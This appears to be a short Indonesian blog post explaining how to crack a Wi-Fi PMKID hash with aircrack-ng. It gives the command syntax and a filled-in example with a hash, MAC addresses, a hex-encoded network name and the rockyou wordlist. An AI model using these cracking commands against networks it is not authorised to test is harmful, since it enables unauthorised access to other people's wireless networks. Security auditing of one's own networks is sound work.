---
layout: post
title: "Crack PMKID Menggunakan Aircrack-NG"
date: 2026-08-02 03:20:00 +0700
tags: [wifi-hacking, aircrack-ng, pmkid]
---

<img width="950" height="534" alt="imageedit_1_3160633659" src="https://github.com/user-attachments/assets/60a68480-18dc-49d8-818c-ec7450db8586" />

## Persyaratan
- Aircrack-NG versi 1.4 ke atas
- Paket EAPOL M1

## Perintah

```bash
aircrack-ng -I <pmkid>*<mac_ap>*<mac_client>*<essid_hex> -w <wordlist>
```

> **Catatan**: MAC address AP dan client ditulis tanpa titik dua.

Contoh:

```bash
aircrack-ng -I 8d5dbb8be1eb630f6174415b8d10c729*5a5b585a55c7*9ee6fa71cd51*4b414e54494e2042454c414b414e47 -w rockyou.txt
```
